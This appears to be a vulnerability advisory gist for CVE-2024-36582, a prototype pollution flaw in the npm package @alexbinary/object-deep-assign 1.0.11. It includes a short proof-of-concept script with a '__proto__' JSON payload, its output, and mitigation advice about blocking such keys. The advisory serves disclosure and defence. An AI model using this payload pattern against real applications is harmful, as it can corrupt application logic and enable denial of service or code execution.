[CVE-2024-36582] Prototype Pollution Vulnerability Affecting @alexbinary/object-deep-assign, version 1.0.11 module

 [Raw](/mestrtee/9fe4d3a862c62ce6b2b0d20d4c5fd346/raw/41fcadba05c029c97810415c5963ae408169d2ea/CVE-2024-36582.md)

[**CVE-2024-36582.md**](#file-cve-2024-36582-md)

## Overview

@alexbinary/object-deep-assign npm package, version 1.0.11 has a potential prototype pollution. The vulnerability located at `Module.deepAssign (/src/index.js:9)`. when `extend()` method
used to recursively copy source property to the destination. Since there's no security checks in-place, an attacker can be exploit this method to copy malicious property to the built-in Object.prototype through the special properties `__proto__` or `constructor.prototype`.
Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service,
remote code execution or cross-site scripting attacks.

## PoC:

```
(async () => {
  const lib = await import('@alexbinary/object-deep-assign');

var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}');
var victim = {}
console.log("Before Attack: ", JSON.stringify(victim.__proto__));
try {
  lib.default ({}, BAD_JSON)
} catch (e) { }
console.log("After Attack: ", JSON.stringify(victim.__proto__));
delete Object.prototype.polluted;
})();

```

Output:

```
Before Attack:  {}
After Attack:  {"polluted":true}
```

Output of a successful fix:

```
Before Attack:  {}
After Attack:  {}
```

## How to prevent:

No updates were provided by the maintainer. Users of this module are urged to implement proper santization and validation over user's supplied inputs, such as blocking inputs containing `__proto__` and `contructor.prototype`
